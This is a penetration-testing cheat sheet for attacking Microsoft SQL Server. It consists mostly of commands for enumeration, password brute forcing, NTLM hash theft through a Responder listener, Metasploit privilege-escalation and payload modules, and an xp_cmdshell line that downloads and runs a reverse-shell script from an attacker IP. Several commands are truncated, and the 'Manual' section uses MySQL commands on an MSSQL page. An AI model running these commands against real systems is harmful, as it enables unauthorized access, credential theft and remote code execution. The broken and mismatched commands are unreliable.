---
description: (TCP 1433-4, 135/UDP 143)(TCP 1433-4, 135/UDP 143)
---

# MSSQL

## :information\_source: Introduction

#### [Microsoft SQL](https://medium.com/@toprak.mhmt/what-is-mssql-9a152d7d4ed0)

By default, the typical ports used by SQL Server and associated database engine services are: **TCP 1433, 4022, 135, 1434, UDP 1434.**

## :ballot\_box\_with\_check: Checklist

* [ ] Try to query the DB if you have creds
* [ ] heck for DAC (Dedicated Access Connection)
* [ ] Login brute force
* [ ] Try NTLM relay with a fake SMB server
* [ ] If you can get access, check for privilege escalation methods to gain admin access to DB
* [ ] Check for CVEs

## Enumeration

```
nmap -sV -p 1433,1433  <IP>
nmap --script ms-sql-info <IP>
auxiliary/scanner/mssql/mssql_ping
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <I
```

## Authenticate with Empty Password

```
# Attempts to authenticate to Microsoft SQL Servers using an empty password forthe sysadmin (sa) account.
ms-sql-empty-password
```

## Login Brute Force

```
nmap -p 1433 –script ms-sql-brute –script-args userdb=[user.txt] ,passdb=[pass.txt] [target
use auxiliary/scanner/mssql/mssql_login
hydra -L [user.txt] –P [pass.txt] [target] mssql
medusa -h [target] –U [user.txt] –P [pass.txt] –M mssql
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```

## Dedicated Admin Connection (DAC)

The DAC port is used to connect to the database instance when normal connection attempts fail, for example, when server is hanging, out of memory or in other bad states. In addition, the DAC port provides an admin with access to system objects otherwise not accessible over normal connections.

The DAC feature is accessible on the loopback adapter per default, but can be activated for remote access by setting the 'remote admin connection' configuration value to 1. In some cases, when DAC has been remotely enabled but later disabled, the sql browser service may incorrectly report it as available.

```
sudo nmap -sU -p 1434 --script ms-sql-dac <ip>
```

![](<../../.gitbook/assets/image (276) (1) (1) (1) (1) (1) (1) (1).png>)

## Query (with credentials)

### Automated

Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers, and configuration settings.

{% hint style="warning" %}
Credentials are required
{% endhint %}

```
nmap --script ms-sql-config
# example:
nmap -p 1433 --script ms-sql-config --script-args mssql.username=sa,mssql.password=sa <host>
```

sample output:

![](<../../.gitbook/assets/image (274) (1) (1).png>)

#### Other nmap Scripts with Credentials

```
# Dumps the password hashes from an MS-SQL server in a format suitable
# Credentials required
ms-sql-dump-hashes

# Queries Microsoft SQL Server (ms-sql) instances for a list of databases a user hasaccess to.
# Credentials required
ms-sql-hasdbaccess

# Runs a query against Microsoft SQL Server (ms-sql).
# Credentials required.
ms-sql-query

# Queries Microsoft SQL Server (ms-sql) for a list of tables per database.
# Credentials required
ms-sql-tables

# Attempts to run a command using the command shell of Microsoft SQL Server (ms-sql)
# Credentials required
ms-sql-xp-cmdshell
```

#### Metasploit Modules:

```
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used
​
#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder
​
#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump
​
#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf
​
#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin
​
#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload
​
#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```

#### impacket mssqlclient:

```
mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine
​
#Once logged in you can run queries:
SQL> select @@ version;
​
#Steal NTLM hash
sudo responder -I <interface> #Run that in other console
SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat
​
#Try to enable code execution
SQL> enable_xp_cmdshell
​
#Execute code, 2 sintax, for complex and non complex cmds
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
```

#### sqsh

```
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
```

### Manual

#### Local:

```
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
mysql -u root -h 127.0.0.1 -e 'show databases;'
```

Remote:

```
mysql -h <Hostname> -u root
mysql -h <Hostname> -u user@target-host
```

## MSSQL - SMB Relay Attack

If we are in the local network we can run an MitM attack and grab NTLM hashes by setting up a fake SQL server and making the service authenticate against our server.

{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit" %}

## Stored Procedures (db\_owner to sysadmin)

#### if we have the credentials of a DB user we can become sysadmin and execute commands remotely:

{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases" %}

### Metasploit

```
use auxiliary/admin/mssql/mssql_esclate_dbowner
set rhost 172.20.10.2
set rport 1433
set username db1_owner
set password MyPassword!
```

## Stored Procedures (user impersonation)

This technique is mostly used for privilege escalation.

{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation" %}





















